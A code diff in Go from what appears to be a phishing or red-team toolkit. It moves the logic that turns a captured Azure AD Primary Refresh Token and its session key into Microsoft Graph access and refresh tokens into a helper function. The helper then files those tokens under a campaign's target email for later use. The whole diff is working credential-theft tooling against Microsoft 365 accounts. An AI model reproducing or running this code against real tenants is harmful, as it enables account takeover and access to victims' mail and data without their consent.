@@ -316,54 +316,72 @@ func (tl *TokenListener) ingestPRT(w http.ResponseWriter, r *http.Request, in to
 	// Optional auto-exchange: PRT → Graph access token → ingest into campaign.
 	// Requires a session key (to sign the assertion) and a target campaign.
 	if campaignID != "" && in.SessionKey != "" {
-		clientID := pickNonEmpty(in.ExClientID, "d3590ed6-52b3-4102-aeff-aad2292ab01c") // Office
-		resource := pickNonEmpty(in.ExResource, "https://graph.microsoft.com")
-		p := &prtpkg.PRT{
-			ID: prtID, Token: in.prt(), SessionKey: in.SessionKey,
-			TargetUPN: upn, TenantID: in.TenantID,
-		}
-		raw, err := prtpkg.ToAccessToken(context.Background(), p, clientID, resource, "")
+		res, err := tl.ExchangePRTIntoCampaign(campaignID, prtID, in.prt(), in.SessionKey,
+			upn, in.TenantID, in.ExClientID, in.ExResource, pickNonEmpty(in.Source, "prt-listener"))
 		if err != nil {
 			resp["exchange_error"] = err.Error()
 			outcome = "prt_stored;exchange_error"
 		} else {
-			var tok struct {
-				AccessToken  string             `json:"access_token"`
-				RefreshToken string             `json:"refresh_token"`
-				IDToken      string             `json:"id_token"`
-				TokenType    string             `json:"token_type"`
-				ExpiresIn    devicecode.FlexInt `json:"expires_in"`
-				Scope        string             `json:"scope"`
-			}
-			_ = json.Unmarshal(raw, &tok)
-			if tok.AccessToken == "" {
-				resp["exchange_error"] = "PRT exchange returned no access_token"
-				outcome = "prt_stored;exchange_empty"
-			} else if res, ierr := tl.mgr.IngestCapturedToken(campaignID, campaigns.CapturedToken{
-				AccessToken:  tok.AccessToken,
-				RefreshToken: tok.RefreshToken,
-				IDToken:      tok.IDToken,
-				TokenType:    tok.TokenType,
-				ExpiresIn:    int(tok.ExpiresIn),
-				Scope:        tok.Scope,
-				TargetEmail:  upn,
-				Source:       pickNonEmpty(in.Source, "prt-listener"),
-			}); ierr != nil {
-				resp["exchange_error"] = ierr.Error()
-				outcome = "prt_stored;ingest_error"
-			} else {
-				resp["exchanged"] = true
-				resp["campaign_id"] = campaignID
-				resp["target_id"] = res.TargetID
-				resp["target_email"] = res.TargetEmail
-				outcome = "prt_stored;exchanged"
-			}
+			resp["exchanged"] = true
+			resp["campaign_id"] = campaignID
+			resp["target_id"] = res.TargetID
+			resp["target_email"] = res.TargetEmail
+			outcome = "prt_stored;exchanged"
 		}
 	}
 
 	tl.audit(r, in, campaignID, upn, outcome)
 	log.Printf("[token-listener] PRT stored id=%s upn=%s outcome=%s", prtID, upn, outcome)
 	writeJSON(w, 200, resp)
+}
+
+// ExchangePRTIntoCampaign mints a Graph access token from a PRT (requires the
+// session key) and ingests it into the campaign so it is usable in Graph Actions.
+// It is used both by the listener's auto-exchange and by the console "Use in
+// Graph" action on an already-stored PRT.
+func (tl *TokenListener) ExchangePRTIntoCampaign(campaignID, prtID, prtToken, sessionKey, upn, tenantID, clientID, resource, source string) (*devicecode.TokenResult, error) {
+	if sessionKey == "" {
+		return nil, fmt.Errorf("PRT has no session key; cannot mint tokens")
+	}
+	if campaignID == "" {
+		return nil, fmt.Errorf("campaign required for exchange")
+	}
+	if clientID == "" {
+		clientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c" // Office
+	}
+	if resource == "" {
+		resource = "https://graph.microsoft.com"
+	}
+	p := &prtpkg.PRT{ID: prtID, Token: prtToken, SessionKey: sessionKey, TargetUPN: upn, TenantID: tenantID}
+	raw, err := prtpkg.ToAccessToken(context.Background(), p, clientID, resource, "")
+	if err != nil {
+		return nil, fmt.Errorf("PRT exchange: %w", err)
+	}
+	var tok struct {
+		AccessToken  string             `json:"access_token"`
+		RefreshToken string             `json:"refresh_token"`
+		IDToken      string             `json:"id_token"`
+		TokenType    string             `json:"token_type"`
+		ExpiresIn    devicecode.FlexInt `json:"expires_in"`
+		Scope        string             `json:"scope"`
+	}
+	_ = json.Unmarshal(raw, &tok)
+	if tok.AccessToken == "" {
+		return nil, fmt.Errorf("PRT exchange returned no access_token")
+	}
+	if source == "" {
+		source = "prt"
+	}
+	return tl.mgr.IngestCapturedToken(campaignID, campaigns.CapturedToken{
+		AccessToken:  tok.AccessToken,
+		RefreshToken: tok.RefreshToken,
+		IDToken:      tok.IDToken,
+		TokenType:    tok.TokenType,
+		ExpiresIn:    int(tok.ExpiresIn),
+		Scope:        tok.Scope,
+		TargetEmail:  upn,
+		Source:       source,
+	})
 }
 
 // parseTokenIntake reads the token payload as JSON (default) or form-urlencoded,
